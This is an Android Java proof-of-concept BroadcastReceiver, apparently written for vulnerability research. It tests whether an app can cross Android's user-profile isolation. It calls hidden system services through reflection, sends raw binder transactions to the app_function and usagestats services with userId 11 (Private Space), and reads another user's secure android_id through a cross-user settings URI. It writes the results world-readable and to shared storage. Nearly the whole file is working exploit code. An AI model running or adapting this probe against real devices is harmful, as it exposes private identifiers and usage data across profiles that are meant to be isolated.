package com.poc.crossuser;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.io.File;
import java.io.FileWriter;
import java.lang.reflect.Method;

public class TestReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== Cross-User PoC (BroadcastReceiver) ===\n");
        sb.append("Package: ").append(context.getPackageName()).append("\n");
        sb.append("UID: ").append(android.os.Process.myUid()).append("\n");
        sb.append("UserID: ").append(android.os.Process.myUid() / 100000).append("\n\n");

        // Test 1: AppFunction service
        sb.append("--- Test 1: AppFunction Binder ---\n");
        try {
            IBinder binder = getServiceBinder("app_function");
            if (binder != null) {
                sb.append("[OK] Got app_function binder\n");
                String desc = "android.app.appfunctions.IAppFunctionManager";
                for (int tx = 1; tx <= 7; tx++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    data.writeInterfaceToken(desc);
                    try {
                        binder.transact(tx, data, reply, 0);
                        int ex = reply.readInt();
                        if (ex == 0) {
                            sb.append("  TX=").append(tx).append(": SUCCESS\n");
                        } else {
                            String msg = reply.readString();
                            String s = msg != null ? msg.substring(0, Math.min(60, msg.length())) : "null";
                            sb.append("  TX=").append(tx).append(": Ex=").append(ex).append(" ").append(s).append("\n");
                        }
                    } catch (Exception e) {
                        sb.append("  TX=").append(tx).append(": ").append(e.getClass().getSimpleName()).append("\n");
                    }
                    data.recycle();
                    reply.recycle();
                }
            } else {
                sb.append("[FAIL] No app_function binder\n");
            }
        } catch (Exception e) {
            sb.append("Error: ").append(e.getMessage()).append("\n");
        }

        // Test 2: Cross-user Settings
        sb.append("\n--- Test 2: Settings cross-user ---\n");
        try {
            Uri uri = Uri.parse("content://11@settings/secure/android_id");
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(uri, null, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    int idx = cursor.getColumnIndex("value");
                    String val = idx >= 0 ? cursor.getString(idx) : "no col";
                    sb.append("android_id(user11) = ").append(val).append("\n");
                    sb.append(">>> VULNERABLE\n");
                } else {
                    sb.append("Empty cursor\n");
                }
                cursor.close();
            } else {
                sb.append("null cursor\n");
            }
        } catch (SecurityException e) {
            sb.append("SecurityException: ").append(e.getMessage()).append("\n");
            sb.append(">>> PROTECTED\n");
        } catch (Exception e) {
            sb.append(e.getClass().getSimpleName()).append(": ").append(e.getMessage()).append("\n");
        }

        // Test 3: UsageStats cross-user
        sb.append("\n--- Test 3: UsageStats cross-user ---\n");
        try {
            IBinder binder = getServiceBinder("usagestats");
            if (binder != null) {
                String desc = "android.app.usage.IUsageStatsManager";
                // Try queryEventsForUser with userId=11
                for (int tx = 5; tx <= 7; tx++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    data.writeInterfaceToken(desc);
                    data.writeInt(11); // userId = Private Space
                    data.writeLong(System.currentTimeMillis() - 86400000L);
                    data.writeLong(System.currentTimeMillis());
                    data.writeString(context.getPackageName());
                    try {
                        binder.transact(tx, data, reply, 0);
                        int ex = reply.readInt();
                        if (ex == 0) {
                            sb.append("  TX=").append(tx).append(" (userId=11): SUCCESS!\n");
                        } else {
                            String msg = reply.readString();
                            String s = msg != null ? msg.substring(0, Math.min(80, msg.length())) : "null";
                            sb.append("  TX=").append(tx).append(": ").append(s).append("\n");
                        }
                    } catch (Exception e) {
                        sb.append("  TX=").append(tx).append(": ").append(e.getClass().getSimpleName()).append("\n");
                    }
                    data.recycle();
                    reply.recycle();
                }
            }
        } catch (Exception e) {
            sb.append("Error: ").append(e.getMessage()).append("\n");
        }

        // Write output to internal storage
        try {
            File dir = context.getFilesDir();
            dir.mkdirs();
            File f = new File(dir, "output.txt");
            FileWriter fw = new FileWriter(f);
            fw.write(sb.toString());
            fw.close();
            f.setReadable(true, false);
        } catch (Exception e) {
            sb.append("\nWrite error: ").append(e.getMessage());
        }
        // Also try /sdcard
        try {
            FileWriter fw = new FileWriter("/sdcard/Download/poc_output.txt");
            fw.write(sb.toString());
            fw.close();
        } catch (Exception e2) {}
        // Set result for the broadcast
        setResultCode(1);
        setResultData(sb.toString());
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }
}
